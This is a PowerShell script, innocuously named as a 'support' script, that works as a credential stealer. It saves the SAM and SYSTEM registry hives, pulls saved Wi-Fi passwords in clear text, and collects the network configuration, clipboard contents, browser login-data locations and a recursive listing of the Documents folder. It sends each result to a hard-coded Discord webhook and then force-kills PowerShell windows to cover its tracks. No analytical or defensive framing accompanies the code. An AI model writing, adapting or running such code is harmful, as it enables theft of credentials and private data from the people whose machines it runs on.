# Supporting PowerShell Script: support_script.ps1

# Define Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1310574631249248297/uINhiPCPEfFgH3NlZ_ioU1tAtGMwYJXfxND5yc-iSrb_a_TAR46kPq6WhTRWZY0r_qdj"

# Function to send data to Discord
function Send-PayloadToDiscord {
    param (
        [string]$content
    )
    try {
        Add-Type -AssemblyName "System.Net.Http"
        $client = New-Object System.Net.Http.HttpClient
        $payload = @{ "content" = $content } | ConvertTo-Json -Depth 10
        $contentObj = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
        $client.PostAsync($webhookUrl, $contentObj).Result
    } catch {
        Write-Host "Failed to send payload: $_"
    }
}

# Extract SAM and SYSTEM Registry Hives
try {
    reg save HKLM\SAM sam /y
    reg save HKLM\SYSTEM system /y
    Send-PayloadToDiscord -content "SAM and SYSTEM registry hives saved."
} catch {
    Write-Host "Error saving SAM or SYSTEM: $_"
}

# Extract Wi-Fi Credentials
try {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
    $results = "Wi-Fi Credentials:`n"
    foreach ($profile in $wifiProfiles) {
        $keyContent = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content\s+:\s+(.*)$"
        if ($keyContent) {
            $results += "${profile}: $($keyContent.Matches.Groups[1].Value)`n"
        } else {
            $results += "${profile}: No password found`n"
        }
    }
    Send-PayloadToDiscord -content $results
} catch {
    Write-Host "Error extracting Wi-Fi credentials: $_"
}

# Extract Network Configuration
try {
    $netConfig = Get-NetIPAddress | Out-String
    Send-PayloadToDiscord -content "Network Configuration:`n$netConfig"
} catch {
    Write-Host "Error extracting network configuration: $_"
}

# Extract Clipboard Content
try {
    $clipboard = Get-Clipboard
    Send-PayloadToDiscord -content "Clipboard Content:`n$clipboard"
} catch {
    Write-Host "Error extracting clipboard content: $_"
}

# Extract Browser Saved Credentials
try {
    $browsers = @('Google\\Chrome', 'Microsoft\\Edge')
    foreach ($browser in $browsers) {
        $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
        if (Test-Path $loginData) {
            Send-PayloadToDiscord -content "Browser: $browser - Login Data file found."
        }
    }
} catch {
    Write-Host "Error extracting browser credentials: $_"
}

# List Files in My Documents
try {
    $myDocs = Get-ChildItem "$env:USERPROFILE\Documents" -Recurse | Select-Object FullName, Length, LastWriteTime | Out-String
    Send-PayloadToDiscord -content "Files in My Documents:`n$myDocs"
} catch {
    Write-Host "Error listing My Documents: $_"
}

# Close PowerShell Windows
try {
    Stop-Process -Name "powershell" -Force
} catch {
    Write-Host "Error closing PowerShell: $_"
}
